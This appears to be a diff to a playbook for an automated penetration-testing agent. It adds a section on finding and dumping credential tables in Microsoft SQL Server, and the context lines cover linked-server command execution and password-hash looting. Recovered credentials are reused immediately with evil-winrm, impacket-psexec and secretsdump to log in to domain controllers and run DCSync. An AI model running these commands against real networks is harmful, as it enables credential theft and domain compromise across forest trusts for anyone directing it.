@@ -33,6 +33,15 @@ Authentication/credentials, if provided, are described in the operator directive
 - `SELECT * FROM sys.servers WHERE is_linked=1;`; execute on a link: `EXEC ('SELECT system_user,@@servername') AT [LINKED];`. A self-mapped sysadmin link = remote command exec, possibly cross-domain.
 - Loot: `SELECT name,password_hash FROM sys.sql_logins;` (`-m 1731`), connection strings, DPAPI/saved creds via command exec. Validate a looted domain cred BENIGNLY: `nxc smb <host> -u <acct> -H <hash>` (`Pwn3d!`).
 
+### 5b. Application credential stores (HIGH-VALUE — do this on ANY read access)
+Even without sysadmin, a plain db-read login can expose credentials an application stores in its own tables — frequently the fastest path to Domain Admin and across forest trusts.
+- Enumerate every non-system database and hunt credential-bearing tables/columns:
+  `SELECT name FROM sys.databases WHERE database_id>4;` then per DB
+  `SELECT t.name AS tbl, c.name AS col FROM sys.tables t JOIN sys.columns c ON t.object_id=c.object_id WHERE c.name LIKE '%pass%' OR c.name LIKE '%cred%' OR c.name LIKE '%secret%' OR c.name LIKE '%pwd%' OR t.name LIKE '%cred%' OR t.name LIKE '%account%' OR t.name LIKE '%user%';`
+- DUMP the matching tables: `USE <db>; SELECT * FROM dbo.<CredentialTable>;`. Expect service accounts, domain-admin and CROSS-FOREST credentials (one forest's app DB often stores the next forest's admin creds, incl the forest-root DA).
+- REUSE immediately: validate each recovered account benignly (`nxc smb/winrm <host> -u <acct> -p <pass> -d <domain>` → `Pwn3d!`/`(Pwn3d!)`), then LOG IN DIRECTLY to the domain controllers it unlocks (`evil-winrm -i <dc> -u <adm> -p <pass> -d <domain>`, `impacket-psexec '<domain>/<adm>:<pass>@<dc>'`) and DCSync each (`impacket-secretsdump '<domain>/<adm>:<pass>@<dc>'`). Prefer a direct credential login over fighting a tunnel/AV for a DCSync you can get for free.
+- This is CWE-522/CWE-256 (plaintext/exposed credential storage) AND the pivot primitive to every reachable forest — report the disclosure AND the resulting access it proves.
+
 ### 6. Report Format
 For each CONFIRMED finding:
 ```
